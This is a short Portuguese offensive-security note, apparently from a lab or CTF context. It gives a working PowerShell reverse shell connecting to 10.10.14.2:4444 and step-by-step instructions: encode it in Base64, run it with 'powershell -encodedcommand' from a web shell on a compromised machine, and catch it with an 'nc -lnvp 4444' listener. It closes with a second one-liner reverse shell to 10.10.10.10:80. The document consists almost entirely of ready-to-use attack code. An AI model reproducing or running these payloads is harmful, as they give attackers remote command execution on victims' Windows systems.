$client = New-Object System.Net.Sockets.TCPClient( '10.10.14.2' , 4444 ); ## altere seu IP/Porta conforme necessário
 $stream = $client.GetStream(); 
[byte[]]$bytes = 0 .. 65535 |%{0}; 
while (($i = $stream.Read($bytes, 0 , $bytes.Length)) -ne  0 ) { 
    $data = ([System.Text.Encoding]::ASCII).GetString($bytes, 0 , $i); 
    $sendback = (Invoke-Expression -Command $data 2 >& 1 | Out-String); 
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ' ; 
    $sendbyte = ([System.Text.Encoding]::ASCII).GetBytes($sendback2); 
    $stream.Write($sendbyte, 0 , $sendbyte.Length); 
    $stream.Flush(); 
} 
$client.Close();

Salve este script como reverse.ps1 em sua máquina Kali.

Codifique o conteúdo reverse.ps1em Base64:

#cat reverse.ps1 | iconv -t UTF-16LE | base64 -w 0

Agora que você tem o comando codificado em Base64, pode executá-lo no shell web do PowerShell na máquina comprometida. 

Use a seguinte sintaxe:

powershell -encodedcommand < String_Base64 >

Na sua máquina Kali, configure um ouvinte para capturar a conexão do shell reverso. Use o seguinte netcatpara isso:

nc  -lnvp  4444


$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
